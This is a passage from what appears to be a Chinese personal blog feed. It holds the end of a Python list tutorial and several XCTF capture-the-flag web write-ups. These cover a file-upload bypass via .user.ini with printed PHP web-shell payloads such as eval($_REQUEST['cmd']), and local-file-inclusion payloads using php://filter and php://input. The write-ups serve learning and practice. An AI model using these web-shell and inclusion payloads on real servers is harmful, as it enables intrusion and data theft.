href="#获取列表中的多个元素" class="headerlink" title="获取列表中的多个元素"></a>获取列表中的多个元素</h3><p>列表名[start:stop:step]</p><p>eg:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">list1</span>=[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>,<span class="hljs-number">60</span>,<span class="hljs-number">70</span>,<span class="hljs-number">80</span>]<br><span class="hljs-attribute">list2</span>=list1[<span class="hljs-number">1</span>:<span class="hljs-number">6</span>:<span class="hljs-number">1</span>]<br><span class="hljs-attribute">print</span>(list2) #<span class="hljs-meta"> [20, 30, 40, 50, 60]</span><br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">1</span>:<span class="hljs-number">6</span>])<br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">1</span>:<span class="hljs-number">6</span>:])<br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">1</span>:<span class="hljs-number">6</span>:<span class="hljs-number">2</span>]) #<span class="hljs-meta"> [20, 40, 60]</span><br><span class="hljs-attribute">print</span>(list1[:<span class="hljs-number">6</span>:<span class="hljs-number">2</span>]) #<span class="hljs-meta"> [10, 30, 50]</span><br> <span class="hljs-comment">#step为负数</span><br><span class="hljs-attribute">print</span>(list1[::-<span class="hljs-number">1</span>]) #<span class="hljs-meta"> [80, 70, 60, 50, 40, 30, 20, 10]</span><br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">7</span>::-<span class="hljs-number">1</span>]) #<span class="hljs-meta"> [80, 70, 60, 50, 40, 30, 20, 10]</span><br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">6</span>:<span class="hljs-number">0</span>:-<span class="hljs-number">2</span>]) #<span class="hljs-meta"> [70, 50, 30]</span><br></code></pre></td></tr></tbody></table></figure><h3 id="判断元素在列表中是否存在"><a href="#判断元素在列表中是否存在" class="headerlink" title="判断元素在列表中是否存在"></a>判断元素在列表中是否存在</h3><p><code>元素 in/not in 列表</code></p><p>列表元素的遍历：<code>for 迭代变量 in 列表名：  操作</code></p><p>eg: </p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">list=[10,20,<span class="hljs-string">'python'</span>,<span class="hljs-string">'hello'</span>]<br><span class="hljs-built_in">print</span>(10 <span class="hljs-keyword">in</span> list) # <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(100 <span class="hljs-keyword">in</span> list) # <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(10 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> list) # <span class="hljs-literal">False</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list:<br>    <span class="hljs-built_in">print</span>(i) #10 20 python hello<br></code></pre></td></tr></tbody></table></figure><h2 id="列表增加"><a href="#列表增加" class="headerlink" title="列表增加"></a>列表增加</h2><ul><li>append() 在列表末尾添加一个元素</li><li>extend() 在列表末尾至少添加一个元素</li><li>insert() 在列表任意位置添加一个位置</li><li>切片 在任意位置至少添加一个元素</li></ul><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">list=[10,20,30]<br>list.append(100)<br><span class="hljs-built_in">print</span>(list) #[10,20,30,100]<br>list2=[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>]<br>list.append(list2)<br><span class="hljs-built_in">print</span>(list) # [10, 20, 30, 100, [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>]]<br>list.extend(list2)<br><span class="hljs-built_in">print</span>(list) # [10, 20, 30, 100, [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>], <span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>] <br>list.insert(1,90)<br><span class="hljs-built_in">print</span>(list) # [10, 90, 20, 30, 100, [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>], <span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>]<br>list3=[<span class="hljs-literal">True</span>,<span class="hljs-literal">False</span>,<span class="hljs-string">'hello'</span>]<br>list[1:]=list3<br><span class="hljs-built_in">print</span>(list) # [10, <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>, <span class="hljs-string">'hello'</span>]<br></code></pre></td></tr></tbody></table></figure><h2 id="列表删除"><a href="#列表删除" class="headerlink" title="列表删除"></a>列表删除</h2><ul><li>remove() 一次删一个；重复元素只删第一个；元素不存在返回error</li><li>pop() 删除一个指定索引位置上的元素；指定索引不存在返回error;不指定索引，删除列表中最后一个元素</li><li>切片 一次至少删除一个元素</li><li>clear() 清空列表</li><li>del 删除列表</li></ul><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros">list=[10,20,30,40,50,60,30]<br>list.<span class="hljs-built_in">remove</span>(30)<br><span class="hljs-built_in">print</span>(list) # [10, 20, 40, 50, 60, 30]<br>list.pop()<br><span class="hljs-built_in">print</span>(list) # [10, 20, 40, 50, 60]<br>list.pop(1)<br><span class="hljs-built_in">print</span>(list) # [10, 40, 50, 60]<br><span class="hljs-attribute">new_list</span>=list[1:3]<br><span class="hljs-built_in">print</span>(list) # [10, 40, 50, 60]<br><span class="hljs-built_in">print</span>(new_list) # [40, 50]<br> #不产生新的列表，直接删除原列表内容<br>list[1:3]=[]<br><span class="hljs-built_in">print</span>(list) # [10, 60]<br>list.clear()<br><span class="hljs-built_in">print</span>(list) # []<br> #del 删除列表<br>del list<br><span class="hljs-built_in">print</span>(list)<br><span class="hljs-built_in">print</span>(list) # &lt;class <span class="hljs-string">'list'</span>&gt;<br></code></pre></td></tr></tbody></table></figure><h2 id="列表修改"><a href="#列表修改" class="headerlink" title="列表修改"></a>列表修改</h2><ul><li>为指定索引的元素赋予一个新值</li><li>为指定的切片赋予一个新值</li></ul><p>eg:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">list</span>=[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>]<br><span class="hljs-attribute">list</span>[<span class="hljs-number">2</span>]=<span class="hljs-number">100</span><br><span class="hljs-attribute">print</span>(list) #<span class="hljs-meta"> [10, 20, 100, 40]</span><br><span class="hljs-attribute">list</span>[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>]=[<span class="hljs-number">300</span>,<span class="hljs-number">400</span>,<span class="hljs-number">500</span>]<br><span class="hljs-attribute">print</span>(list) #<span class="hljs-meta"> [10, 300, 400, 500, 40]</span><br></code></pre></td></tr></tbody></table></figure><h2 id="列表排序"><a href="#列表排序" class="headerlink" title="列表排序"></a>列表排序</h2><ul><li>调用sort(),列中所有元素默认按照从小到大顺序进行排序，可以指定reverse=True进行降序。</li><li>调用内置函数sorted(),可以指定reverse=True进行降序排序，原列表不发生变化（产生新列表）</li></ul><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">list=[20,40,10,98,45]<br>list.sort()<br><span class="hljs-built_in">print</span>(list) # [10, 20, 40, 45, 98]<br> #降序<br>list.sort(<span class="hljs-attribute">reverse</span>=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(list) # [98, 45, 40, 20, 10]<br>list.sort(<span class="hljs-attribute">reverse</span>=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(list) # [10, 20, 40, 45, 98]<br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span>=[<span class="hljs-number">20</span>,<span class="hljs-number">40</span>,<span class="hljs-number">10</span>,<span class="hljs-number">98</span>,<span class="hljs-number">45</span>]<br>new_list=<span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>) <span class="hljs-comment"># [20, 40, 10, 98, 45]</span><br><span class="hljs-built_in">print</span>(new_list) <span class="hljs-comment"># [10, 20, 40, 45, 98]</span><br> <span class="hljs-comment">#降序</span><br>desc_list=<span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">list</span>,reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(desc_list) <span class="hljs-comment"># [98, 45, 40, 20, 10]</span><br></code></pre></td></tr></tbody></table></figure><h2 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h2><p><code>[列表元素的表达式 for i in range(1,10)]</code></p><p>eg：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">l</span>=[i for i in range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>)]<br><span class="hljs-attribute">print</span>(l) #<span class="hljs-meta"> [1, 2, 3, 4, 5, 6, 7, 8, 9]</span><br><span class="hljs-attribute">l2</span>=[ i*<span class="hljs-number">2</span> for i in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>)]<br><span class="hljs-attribute">print</span>(l2) #<span class="hljs-meta"> [2, 4, 6, 8, 10]</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界web-easyupload</title>
    <link href="/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-easyupload/"/>
    <url>/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-easyupload/</url>
    
    <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h1><p>一名合格的黑客眼中，所有的上传点都是开发者留下的后门</p><p><img src="https://s2.loli.net/2022/08/17/ixpUIAyNQBwCkO2.png" alt="图片.png"></p><p>上传文件后返回文件路径了。</p><p>尝试修改后缀为.php，上传失败。</p><p>新建一个txt文件，内容为：</p><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">GIF89a</span><br>abc.jpg<br></code></pre></td></tr></tbody></table></figure><p>然后文件名改成a.jpg</p><p>上传成功。</p><p><img src="https://s2.loli.net/2022/08/17/Yvi2QP7humpFBAw.png" alt="图片.png"></p><p>（注：我以为是带着jpg的头文件就可以用一句话木马了，结果蚁剑连着的时候数据为空，是我天真了，果断看官方wp）</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>利用文件上传漏洞点，通过绕过服务器的安全防护，达到getshell的目的，主要考察利用fastcgi的.user.ini特性进行任意命令执行</p><p>有关利用.usr.ini构建php后门，博文贴：</p><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><h2 id="绕过的点："><a href="#绕过的点：" class="headerlink" title="绕过的点："></a>绕过的点：</h2><ul><li>检查文件是否有php字符串<ul><li>可以利用段标签绕过，例如<code>&lt;?=phpinfo();?&gt;</code></li></ul></li><li>检查后缀中是否有htaccess或ph<ul><li>可以通过上传.user.ini以及正常jpg文件来进行getshell，在服务器中只要运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini,并作为cgi的启动项。</li><li>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如<code>auto+prepend_file</code></li></ul></li><li>检查文件头部信息<ul><li>绕过方式即在文件头部添加一个图片的文件头，比如<code>GIF89a</code></li></ul></li><li>文件MIME类型<ul><li>绕过方法即修改上传时的Content-Type</li></ul></li></ul><p>新建文件更名为.user.ini，内容为</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=a.jpg<br></code></pre></td></tr></tbody></table></figure><p>上传.user.ini，bp抓包，更改Content-Type为<code>image/jpg</code>,放包，显示上传成功。</p><p><img src="https://s2.loli.net/2022/08/17/eaqHKAEVGvypFcB.png" alt="图片.png"></p><p>新建文件更名为a.jpg，内容为</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">GIF89a<br><span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">'cat /flag);?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>上传成功，蚁剑连接，找到flag:</p><p><img src="https://s2.loli.net/2022/08/17/ovweEJS9kI1NDZG.png" alt="图片.png"></p><p>不知道为什么，官方给的payload上传之后500报错，换了一个payload成功了：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'cmd'</span>]);<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure><p><img src="https://s2.loli.net/2022/08/17/mbTtcXO3wzKF8G6.png" alt="图片.png"></p><pre><code class="hljs">cyberpeace{6ed12a66909f053b9bc1799622c9ce7e}</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>WEB</tag>
      
      <tag>攻防世界</tag>
      
      <tag>文件上传漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界web-fileinclude</title>
    <link href="/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileinclude/"/>
    <url>/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileinclude/</url>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://s2.loli.net/2022/08/17/dhX79DGxo4rptkT.png" alt="图片.png"></p><p>题目告知flag在flag.php里，分析源代码：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">'display_errors'</span>) ) {<br>  <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'display_errors'</span>, <span class="hljs-string">'On'</span>); <span class="hljs-comment"># 打开报错提示</span><br>  }<br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL); <span class="hljs-comment">#设置php的报错级别为所有的错误和警告，并返回当前级别</span><br><span class="hljs-variable">$lan</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'language'</span>]; <span class="hljs-comment">#语言切换</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$lan</span>)<br>{<br>@<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"language"</span>,<span class="hljs-string">"english"</span>); <span class="hljs-comment"># setcookie向客户端发送跟一个Http cookie(由服务器发送到浏览器的变量)</span><br>@<span class="hljs-keyword">include</span>(<span class="hljs-string">"english.php"</span>); <span class="hljs-comment"># 导入语言包</span><br>}<br><span class="hljs-keyword">else</span><br>{<br>@<span class="hljs-keyword">include</span>(<span class="hljs-variable">$lan</span>.<span class="hljs-string">".php"</span>);<span class="hljs-comment"># 后缀.php</span><br>}<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'index.php'</span>); <span class="hljs-comment"># index.php 读取到$x中</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span>; <span class="hljs-comment">#输入x</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>设置cookie-language，就可以执行<code>include($lan.".php")</code></p><p>用伪协议<code>php://filter</code>读取文件，格式为：<code>php://filter / [read|write =] 过滤器 / resource= 目标文件 </code></p><h2 id="过滤器的分类（及常见过滤器）"><a href="#过滤器的分类（及常见过滤器）" class="headerlink" title="过滤器的分类（及常见过滤器）"></a>过滤器的分类（及常见过滤器）</h2><p><code>php://filter</code>是一种元封装器，设计用于数据流打开时的筛选过滤应用，</p><ul><li>string filter(字符过滤器)<ul><li>string.rot13  (对字符串执行 ROT13 转换)<ul><li>例：<code>php://filter/string.rot13/resource=flag.php</code></li></ul></li><li>string.toupper (转大写)<ul><li>例：<code>php://filter/string.toupper/resource=flag.php</code></li></ul></li><li>string.tolower (转小写)</li><li>string.strip_tags (去除 HTML 和 PHP 标记，尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果)<ul><li>例：<code>php://filter/string.strip_tags/resource=flag.php</code></li></ul></li></ul></li><li>conversion filter (转换过滤器)<ul><li>convert.base64-encode &amp; convert.base64-decode (base64加密 base64解密)<ul><li>例：<code>php://filter/convert.base64-encode/resource=flag.php</code></li></ul></li><li>convert.quoted-printable-encode &amp; convert.quoted-printable-decode(在字符串后加=0A,及恢复)</li></ul></li><li>compression filter(压缩过滤)<ul><li>zlib.deflate &amp; zlib.inflate(压缩 解压)<ul><li>例：<code>php://filter/zlib.deflate/resource=flag.php</code></li><li>例：<code>php://filter/zlib.inflate/resource=flag.php</code></li></ul></li><li>bzip2.compress &amp; bzip2.decompress(zip 压缩 解压)</li></ul></li><li>encryption filter(加密过滤器)</li></ul><blockquote><p>resource=&lt;要过滤的数据流&gt; ： 必须参数，指定了要筛选过滤的数据流</p><p>read=&lt;独链的筛选列表&gt; ： 可选参数，设定一个或多个过滤器名称，以管道符(/)分隔</p><p>write=&lt;写链的筛选列表&gt; ： 可选参数，设定一个或多个过滤器名称，以管道符(/)分隔</p><p>&lt;;两个链的筛选列表&gt; ： 任何没有以read=或write=做前缀的筛选器列表会视情况应用于读或写链</p></blockquote><p>payload：</p><pre><code class="hljs">`cookie：language=php://filter/convert.base64-encode/resource=flag</code></pre><p>bp抓包，把cookie改成payload,即可得到密文，base64解密即可，或者直接在网页端把cookie改了也行</p><p><img src="https://s2.loli.net/2022/08/17/91ciqRSd3XZpT52.png" alt="图片.png"></p><p>flag: </p><pre><code class="hljs">cyberpeace{771e511122aa7492d439ae469279c22e}</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WEB</tag>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界web-very_easy_sql</title>
    <link href="/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-very_easy_sql%E6%9C%AA%E5%AE%8C%E6%88%90/"/>
    <url>/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-very_easy_sql%E6%9C%AA%E5%AE%8C%E6%88%90/</url>
    
    <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h1><p>太简单了不描述了，给sql签个到吧</p><p><img src="https://s2.loli.net/2022/08/17/7eIHtGJviqkMPbW.png" alt="图片.png"></p><p>题目上说：非内部用户无法访问。</p><p>查看源代码，发现有个use.php文件：</p><p><img src="https://s2.loli.net/2022/08/17/86yfplcZIVDboBu.png" alt="图片.png"></p><p>不行，看大佬写的wp好难，看不懂，先放一放。</p><p><a href="https://blog.csdn.net/m0_48780534/article/details/126309908" title="大佬的博文wp">https://blog.csdn.net/m0_48780534/article/details/126309908</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>WEB</tag>
      
      <tag>攻防世界</tag>
      
      <tag>sql</tag>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php伪协议</title>
    <link href="/2022/08/16/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/08/16/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>os: 整合了一下各路大佬的笔记，省得搜来搜去……</p><p>在CTF中可能遇到的文件包含函数：</p><p>include、require、include_once、require_once、highlight_file、show_source、readfile、file_get_contents、fopen、file</p><h1 id="php支持的伪协议"><a href="#php支持的伪协议" class="headerlink" title="php支持的伪协议"></a>php支持的伪协议</h1><p>php伪协议事实上就是支持的协议与封装协议（12种）</p><ul><li>file:// — 访问本地文件系统</li><li>http:// — 访问 HTTP(s) 网址</li><li>ftp:// — 访问 FTP(s) URLs</li><li>php:// — 访问各个输入/输出流（I/O streams）</li><li>zlib:// — 压缩流</li><li>data:// — 数据（RFC 2397）</li><li>glob:// — 查找匹配的文件路径模式</li><li>phar:// — PHP 归档</li><li>ssh2:// — Secure Shell 2</li><li>rar:// — RAR</li><li>ogg:// — 音频流</li><li>expect:// — 处理交互式的流</li></ul><h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file://"></a>file://</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。</p><p>include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>file:// 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()，include_path 会可选地搜索，也作为相对的路径。</p><h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php://"></a>php://</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p><h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><ul><li>php://input  ——可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=”multipart/form-data” 的时候php://input 是无效的。</li><li>php://output  ——只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</li><li>php://fd  ——(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。</li><li>php://memory 与 php://temp  ——(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</li><li>php://filter  ——(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</li></ul><p>太多了懒得敲了</p><p>贴 </p><p><a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-fileclude</title>
    <link href="/2022/08/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileclude/"/>
    <url>/2022/08/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileclude/</url>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>fileclude</p><p>描述：好多file呀！</p><p>还没学php，简单分析一下代码：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">WRONG WAY! <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);  <span class="hljs-comment"># 引入flag.php文件</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <span class="hljs-comment"># 对文件进行语法高亮显示</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file1"</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file2"</span>])) <span class="hljs-comment"># isset()函数：检测变量是否设置；$_GET[]通过get方法传过来的值</span><br>{<br>    <span class="hljs-variable">$file1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file1"</span>]; <br>    <span class="hljs-variable">$file2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file2"</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file1</span>) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file2</span>)) <span class="hljs-comment"># empty()用于检查一个变量是否为空，此处即file1与file2不为空</span><br>    {<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file2</span>) === <span class="hljs-string">"hello ctf"</span>) <span class="hljs-comment"># file_get_contents()把整个文件读入一个字符串中，此处即将hello ctf读取到fikle2中</span><br>        {<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file1</span>); <span class="hljs-comment"># 包含$file1</span><br>        }<br>    }<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"NONONO"</span>);<br>} <br></code></pre></td></tr></tbody></table></figure><p>（看来想学渗透的话，php学习要提上日程了[汗颜]）</p><p>$file2内容为hello ctf就可以包含$file1，从题目中可看出flag在flag.php中，此题考察<code>file_get_contents</code>和php伪协议的应用</p><p>（有关php伪协议单独写了一篇文，标签为php）</p><p>f12打开 Max HackBar插件</p><p>使用伪协议来构造，得到payload为<code>php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</code>，post data为<code>hello ctf</code></p><p>（不会，搜的大佬wp）</p><p><img src="https://s2.loli.net/2022/08/16/usWiTyB1tdeAqX6.png" alt="图片.png"></p><p>base64解码就得到flag:</p><pre><code class="hljs">cyberpeace{a0dfa411a1fd4d2c2153ad62391732cf}</code></pre><p>关于payload如何构造的，我又去查了一下php伪协议，搜到了一个例子：</p><p>例如在 allow_url_include = on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 